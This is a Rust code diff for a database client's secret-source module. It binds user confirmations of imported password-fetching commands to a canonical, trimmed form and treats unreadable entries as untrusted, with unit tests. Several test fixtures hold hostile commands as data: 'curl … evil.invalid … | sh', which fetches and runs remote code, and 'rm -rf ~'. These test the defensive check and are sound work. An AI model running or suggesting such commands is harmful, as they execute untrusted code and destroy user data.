@@ -14,7 +14,8 @@
 //! from outside this computer (an import, a restored backup) never runs
 //! until the user confirms it here. Confirmations are kept in a local file
 //! next to the state (never synced nor exported), as digests of
-//! (connection, field, exact definition): any change to the text asks again.
+//! (connection, field, definition as the form writes it, see [`canonical`]):
+//! any change that does something asks again.
 
 use crate::state::SavedConnection;
 use dbine_driver::{ConnectionConfig, Error, Result};
@@ -1180,10 +1181,50 @@ pub fn write(cfg: &mut ConnectionConfig, sources: &SecretSources) {
     }
 }
 
+/// The definition as the connection form writes it back: every string
+/// trimmed, and the inputs that do nothing left out (the user's field
+/// without "fill the user", the master command without `master: command`,
+/// the client key without a certificate, what only the password takes on
+/// another field, Zoho's, Delinea's and Bitwarden's `master: none`, which
+/// the form reads as the keychain). Definitions are compared, and
+/// confirmations bound, in this form, so the form's normalization never
+/// turns a definition that came from outside into a new one.
+pub fn canonical(field: &str, source: &SecretSource) -> SecretSource {
+    use serde_json::Value;
+    let Ok(Value::Object(mut m)) = serde_json::to_value(source) else { return source.clone() };
+    for v in m.values_mut() {
+        if let Value::String(s) = v {
+            let t = s.trim();
+            if t.len() != s.len() {
+                *s = t.to_string();
+            }
+        }
+    }
+    let text = |m: &serde_json::Map<String, Value>, k: &str| m.get(k).and_then(Value::as_str).unwrap_or("").to_string();
+    if field != "password" {
+        for k in ["fill_username", "user_field", "username_variable"] {
+            m.remove(k);
+        }
+    }
+    if m.get("fill_username").and_then(Value::as_bool) != Some(true) {
+        m.remove("user_field");
+    }
+    if text(&m, "master") != "command" {
+        m.remove("master_command");
+    }
+    if text(&m, "master") == "none" && matches!(source, SecretSource::Zoho { .. } | SecretSource::Delinea { .. } | SecretSource::Bitwarden { .. }) {
+        m.remove("master");
+    }
+    if text(&m, "client_cert").is_empty() {
+        m.remove("client_key");
+    }
+    serde_json::from_value(Value::Object(m)).unwrap_or_else(|_| source.clone())
+}
+
 /// What a confirmation is bound to: the connection, the field and the
-/// definition exactly as stored. Hex SHA-256.
+/// definition in its [`canonical`] form. Hex SHA-256.
 pub fn digest(connection_id: &str, field: &str, source: &SecretSource) -> String {
-    let def = serde_json::to_string(source).unwrap_or_default();
+    let def = serde_json::to_string(&canonical(field, source)).unwrap_or_default();
     let mut h = Sha256::new();
     for part in ["dbine-secret-source-v1", connection_id, field, def.as_str()] {
         h.update((part.len() as u64).to_le_bytes());
@@ -1259,13 +1300,53 @@ pub fn forget(digests: &[String]) -> Result<()> {
     })
 }
 
+/// A connection's stored definitions entry by entry: an entry that doesn't
+/// parse is `None` (unreadable). `Err` when the option isn't even a JSON
+/// object: unreadable on every field.
+fn stored_entries(cfg: &ConnectionConfig) -> std::result::Result<BTreeMap<String, Option<SecretSource>>, ()> {
+    let Some(json) = cfg.options.get(OPTION).map(|s| s.trim()).filter(|s| !s.is_empty()) else { return Ok(BTreeMap::new()) };
+    let map: serde_json::Map<String, serde_json::Value> = serde_json::from_str(json).map_err(|_| ())?;
+    Ok(map.into_iter().map(|(k, v)| (k, serde_json::from_value(v).ok())).collect())
+}
+
 /// Whether a definition is one that came from outside: some saved
-/// connection has it on the same field and it was never confirmed there.
-/// A definition nobody has (typed in the form now) didn't.
+/// connection has it (in its [`canonical`] form) on the same field and it
+/// was never confirmed there, or has something there that can't be read
+/// (it can't be told apart, so it counts as one). A definition nobody has
+/// (typed in the form now) didn't.
 pub fn from_outside(saved: &[SavedConnection], field: &str, source: &SecretSource) -> bool {
-    saved.iter().any(|c| {
-        read(&c.config).ok().and_then(|s| s.get(field).cloned()).is_some_and(|s| &s == source && !is_approved(&digest(&c.id, field, source)))
+    let wanted = canonical(field, source);
+    saved.iter().any(|c| match stored_entries(&c.config) {
+        Err(()) => true,
+        Ok(entries) => match entries.get(field) {
+            None => false,
+            Some(None) => true,
+            Some(Some(s)) => canonical(field, s) == wanted && !is_approved(&digest(&c.id, field, s)),
+        },
     })
+}
+
+/// Whether the form's definition for `field` needs the user's confirmation
+/// before it runs or is saved as confirmed. While the connection being
+/// edited (`editing`) has an unconfirmed or unreadable definition on that
+/// field, whatever the form sends does: the form rewrites what it loads, so
+/// its text can't tell an untouched outside definition from a new one.
+/// Otherwise, a definition that came from outside ([`from_outside`]) does.
+pub fn needs_confirmation(saved: &[SavedConnection], editing: Option<&str>, field: &str, source: &SecretSource) -> bool {
+    if let Some(c) = editing.filter(|i| !i.is_empty()).and_then(|id| saved.iter().find(|c| c.id == id)) {
+        let unconfirmed = match stored_entries(&c.config) {
+            Err(()) => true,
+            Ok(entries) => match entries.get(field) {
+                None => false,
+                Some(None) => true,
+                Some(Some(s)) => !is_approved(&digest(&c.id, field, s)),
+            },
+        };
+        if unconfirmed {
+            return true;
+        }
+    }
+    from_outside(saved, field, source)
 }
 
 // ---- values ----------------------------------------------------------------
@@ -1688,7 +1769,9 @@ mod tests {
     fn a_confirmation_is_bound_to_the_exact_text() {
         let a = digest("c1", "password", &cmd("pass show db"));
         assert_eq!(a, digest("c1", "password", &cmd("pass show db")));
-        assert_ne!(a, digest("c1", "password", &cmd("pass show db ")), "any change asks again");
+        assert_ne!(a, digest("c1", "password", &cmd("pass show db2")), "any change asks again");
+        // Spaces around it change nothing: the form trims them.
+        assert_eq!(a, digest("c1", "password", &cmd(" pass show db ")));
         assert_ne!(a, digest("c2", "password", &cmd("pass show db")), "another connection asks again");
         assert_ne!(a, digest("c1", "ssh.password", &cmd("pass show db")), "another field asks again");
         // No ambiguity between the parts.
@@ -1721,6 +1804,88 @@ mod tests {
         approve(&digest("imp", "password", &src)).unwrap();
         assert!(!from_outside(&saved, "password", &src), "confirmed where it came from");
         forget(&[digest("imp", "password", &src)]).unwrap();
+    }
+
+    fn saved_with(id: &str, json: &str) -> SavedConnection {
+        let mut config = ConnectionConfig::default();
+        config.options.insert(OPTION.into(), json.into());
+        SavedConnection { id: id.into(), name: id.into(), color: None, config, save_password: true, folder_id: None, tags: vec![], mcp_level: None, updated_at: String::new() }
+    }
+
+    /// The form trims what it loads: a padded definition from outside is
+    /// still the same one, on the connection it came with and in a copy.
+    #[test]
+    fn a_padded_imported_definition_still_asks() {
+        let id = format!("imp-pad-{}", std::process::id());
+        let saved = vec![saved_with(&id, r#"{"password":{"kind":"command","command":"curl -s https://evil.invalid/p | sh "}}"#)];
+        let trimmed = cmd("curl -s https://evil.invalid/p | sh");
+        assert!(from_outside(&saved, "password", &trimmed));
+        assert!(needs_confirmation(&saved, Some(&id), "password", &trimmed));
+        assert!(needs_confirmation(&saved, None, "password", &trimmed));
+        assert!(needs_confirmation(&saved, None, "password", &cmd("  curl -s https://evil.invalid/p | sh")));
+        // Inert inputs the form drops change nothing either.
+        let kp = r#"{"password":{"kind":"keepass","file":"/x.kdbx","entry":"Databases/Prod/pg-main","master":"ask","master_command":"rm -rf ~","user_field":"u"}}"#;
+        let saved = vec![saved_with(&id, kp)];
+        assert!(from_outside(&saved, "password", &keepass("/x.kdbx", MasterSource::Ask)));
+        // Confirmed where it came from: no longer asks (the confirmation is
+        // bound to the definition as the form writes it).
+        let saved = vec![saved_with(&id, r#"{"password":{"kind":"command","command":" pass db "}}"#)];
+        approve(&digest(&id, "password", &cmd(" pass db "))).unwrap();
+        assert!(!needs_confirmation(&saved, Some(&id), "password", &cmd("pass db")));
+        forget(&[digest(&id, "password", &cmd("pass db"))]).unwrap();
+    }
+
+    /// An entry that doesn't parse makes the connection's definitions
+    /// untrusted instead of hiding its valid siblings.
+    #[test]
+    fn a_malformed_sibling_makes_the_field_ask() {
+        let id = format!("imp-bad-{}", std::process::id());
+        let json = r#"{"password":{"kind":"command","command":"curl -s https://evil.invalid/x | sh"},"zz":{"kind":"nope"}}"#;
+        let saved = vec![saved_with(&id, json)];
+        assert!(read(&saved[0].config).is_err(), "serde rejects the whole map");
+        let src = cmd("curl -s https://evil.invalid/x | sh");
+        assert!(from_outside(&saved, "password", &src), "the valid sibling is still compared");
+        assert!(needs_confirmation(&saved, Some(&id), "password", &cmd("echo anything")), "the edited connection's field");
+        // The unreadable entry's own field asks for anything typed on it,
+        // and a map that isn't an object, on every field.
+        assert!(from_outside(&saved, "zz", &cmd("echo typed")));
+        let garbage = vec![saved_with(&id, "not json")];
+        assert!(needs_confirmation(&garbage, Some(&id), "password", &cmd("echo typed")));
+        assert!(from_outside(&garbage, "password", &cmd("echo typed")));
+    }
+
+    /// Typed here: no confirmation, on a new connection or on one whose
+    /// definitions were confirmed; and the confirmations given before the
+    /// definitions were compared in the form's shape stay valid.
+    #[test]
+    fn a_definition_typed_here_needs_no_confirmation() {
+        let id = format!("mine-{}", std::process::id());
+        let saved = vec![saved_with(&id, r#"{"password":{"kind":"command","command":"pass db"}}"#)];
+        assert!(!needs_confirmation(&saved, None, "password", &cmd("pass other")));
+        approve(&digest(&id, "password", &cmd("pass db"))).unwrap();
+        assert!(!needs_confirmation(&saved, Some(&id), "password", &cmd("pass other")));
+        assert!(!needs_confirmation(&saved, Some(&id), "ssh.password", &cmd("pass ssh")));
+        forget(&[digest(&id, "password", &cmd("pass db"))]).unwrap();
+        // What the form writes is already canonical: the digest is the same
+        // as hashing it as stored (the version before canonical forms).
+        let as_stored = |field: &str, s: &SecretSource| {
+            let def = serde_json::to_string(s).unwrap();
+            let mut h = Sha256::new();
+            for part in ["dbine-secret-source-v1", "c", field, def.as_str()] {
+                h.update((part.len() as u64).to_le_bytes());
+                h.update(part.as_bytes());
+            }
+            hex::encode(h.finalize())
+        };
+        for (field, s) in [
+            ("password", cmd("pass db")),
+            ("password", keepass("/x.kdbx", MasterSource::Keychain)),
+            ("ssh.password", zoho("eu")),
+            ("password", bitwarden("", MasterSource::Command)),
+        ] {
+            assert_eq!(canonical(field, &s), s, "{s:?}");
+            assert_eq!(digest("c", field, &s), as_stored(field, &s), "{s:?}");
+        }
     }
 
     #[test]
